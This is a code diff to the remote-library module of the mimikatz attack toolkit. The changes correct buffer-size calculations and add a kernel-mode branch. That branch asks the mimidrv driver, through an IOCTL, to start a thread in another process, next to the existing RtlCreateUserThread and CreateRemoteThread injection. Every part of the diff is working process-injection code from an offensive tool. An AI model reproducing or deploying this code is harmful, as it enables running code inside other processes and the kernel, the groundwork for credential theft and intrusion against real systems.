@@ -77,7 +77,7 @@ HMODULE kull_m_remotelib_LoadLibrary(PKULL_M_MEMORY_HANDLE hProcess, LPCWSTR lpF
 		if(kull_m_file_isFileExist(absolutePath))
 		{
 			szLibName = (DWORD) (wcsnlen_s(absolutePath, MAX_PATH) + 1) * sizeof(wchar_t);
-			pArgsSize = sizeof(REMOTE_LIB_FUNC) - 1 + szLibName;
+			pArgsSize = FIELD_OFFSET(REMOTE_LIB_FUNC, inputData) + szLibName;
 			if(pArgs = (PREMOTE_LIB_FUNC) LocalAlloc(LPTR, pArgsSize))
 			{
 				pArgs->inputSize = szLibName;
@@ -141,7 +141,8 @@ BOOL kull_m_remotelib_create(PKULL_M_MEMORY_ADDRESS aRemoteFunc, LPVOID inputDat
 
 	PREMOTE_LIB_FUNC pArgs = NULL;
 	DWORD pArgsSize;
-	
+	MIMIDRV_THREAD_INFO drvInfo = {(PTHREAD_START_ROUTINE) aRemoteFunc->address, NULL};
+
 	if(isRaw)
 	{
 		pArgsSize = inputDataSize;
@@ -149,10 +150,12 @@ BOOL kull_m_remotelib_create(PKULL_M_MEMORY_ADDRESS aRemoteFunc, LPVOID inputDat
 	}
 	else
 	{
-		*outputData = NULL;
-		*outputDataSize = 0;
-		
-		pArgsSize = sizeof(REMOTE_LIB_FUNC) - 1 + inputDataSize;
+		if(outputData && outputDataSize)
+		{
+			*outputData = NULL;
+			*outputDataSize = 0;
+		}
+		pArgsSize = FIELD_OFFSET(REMOTE_LIB_FUNC, inputData) + inputDataSize;
 		if(pArgs = (PREMOTE_LIB_FUNC) LocalAlloc(LPTR, pArgsSize))
 			if(pArgs->inputSize = inputDataSize)
 				RtlCopyMemory(pArgs->inputData, inputData, inputDataSize);
@@ -163,35 +166,54 @@ BOOL kull_m_remotelib_create(PKULL_M_MEMORY_ADDRESS aRemoteFunc, LPVOID inputDat
 		aLocalAddr.address = pArgs;
 		if(kull_m_memory_copy(&aRemoteData, &aLocalAddr, pArgsSize))
 		{
-			if(MIMIKATZ_NT_MAJOR_VERSION > 5)
+			switch(aRemoteFunc->hMemory->type)
 			{
-				status = RtlCreateUserThread(aRemoteFunc->hMemory->pHandleProcess->hProcess, NULL, 0, 0, 0, 0, (PTHREAD_START_ROUTINE) aRemoteFunc->address, aRemoteData.address, &hThread, NULL);
-				if(!NT_SUCCESS(status))
+			case KULL_M_MEMORY_TYPE_PROCESS:
+				if(MIMIKATZ_NT_MAJOR_VERSION > 5)
 				{
-					hThread = NULL;
-					PRINT_ERROR(L"RtlCreateUserThread (0x%08x)\n", status);
+					status = RtlCreateUserThread(aRemoteFunc->hMemory->pHandleProcess->hProcess, NULL, 0, 0, 0, 0, (PTHREAD_START_ROUTINE) aRemoteFunc->address, aRemoteData.address, &hThread, NULL);
+					if(!NT_SUCCESS(status))
+					{
+						hThread = NULL;
+						PRINT_ERROR(L"RtlCreateUserThread (0x%08x)\n", status);
+					}
 				}
+				else if(!(hThread = CreateRemoteThread(aRemoteFunc->hMemory->pHandleProcess->hProcess, NULL, 0, (PTHREAD_START_ROUTINE) aRemoteFunc->address, aRemoteData.address, 0, NULL)))
+					PRINT_ERROR_AUTO(L"CreateRemoteThread");
+
+				if(hThread)
+				{
+					WaitForSingleObject(hThread, INFINITE);
+					success = CloseHandle(hThread);
+				}
+				break;
+
+			case KULL_M_MEMORY_TYPE_KERNEL:
+				drvInfo.pArg = aRemoteData.address;
+				kprintf(L"Th @ %p\nDa @ %p\n", drvInfo.pRoutine, drvInfo.pArg);
+				if(!(success = kull_m_kernel_ioctl_handle(aRemoteFunc->hMemory->pHandleDriver->hDriver, IOCTL_MIMIDRV_CREATEREMOTETHREAD, &drvInfo, sizeof(MIMIDRV_THREAD_INFO), NULL, NULL, FALSE)))
+					PRINT_ERROR_AUTO(L"kull_m_kernel_ioctl_handle");
+				break;
 			}
-			else if(!(hThread = CreateRemoteThread(aRemoteFunc->hMemory->pHandleProcess->hProcess, NULL, 0, (PTHREAD_START_ROUTINE) aRemoteFunc->address, aRemoteData.address, 0, NULL)))
-				PRINT_ERROR_AUTO(L"CreateRemoteThread");
-			
-			if(hThread)
+
+			if(success)
 			{
-				WaitForSingleObject(hThread, INFINITE);
-				CloseHandle(hThread);
-				success = kull_m_memory_copy(&aLocalAddr, &aRemoteData, sizeof(REMOTE_LIB_FUNC) - sizeof(DWORD) - 1);
+				success = kull_m_memory_copy(&aLocalAddr, &aRemoteData, isRaw ? pArgsSize : FIELD_OFFSET(REMOTE_LIB_FUNC, inputSize));
 				if(!isRaw && success && pArgs->outputData)
 				{
 					success = FALSE;
 					aSuppData.address = pArgs->outputData;
-					if(aLocalAddr.address = LocalAlloc(LPTR, pArgs->outputSize))
+					if(outputData && outputDataSize)
 					{
-						if(success = kull_m_memory_copy(&aLocalAddr, &aSuppData, pArgs->outputSize))
+						if(aLocalAddr.address = LocalAlloc(LPTR, pArgs->outputSize))
 						{
-							*outputData = aLocalAddr.address;
-							*outputDataSize = pArgs->outputSize;
+							if(success = kull_m_memory_copy(&aLocalAddr, &aSuppData, pArgs->outputSize))
+							{
+								*outputData = aLocalAddr.address;
+								*outputDataSize = pArgs->outputSize;
+							}
+							else LocalFree(aLocalAddr.address);
 						}
-						else LocalFree(aLocalAddr.address);
 					}
 					kull_m_memory_free(&aSuppData, 0);
 				}
@@ -249,11 +271,11 @@ BOOL kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(PKULL_M_MEMORY_HANDLE 
 	BOOL success = FALSE;
 	DWORD i, j;
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalAddr = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLocalAddr = {(LPVOID) Buffer, &hLocalMemory};
 	
 	DestAddress->hMemory = hProcess;
 	DestAddress->address = NULL;
-
+	
 	if(RemoteExt)
 	{
 		if(kull_m_remotelib_GetProcAddressMultipleModules(hProcess, RemoteExt))
@@ -276,7 +298,6 @@ BOOL kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(PKULL_M_MEMORY_HANDLE 
 			}
 		}
 	}
-	else aLocalAddr.address = (LPVOID) Buffer;
 
 	if(aLocalAddr.address)
 	{
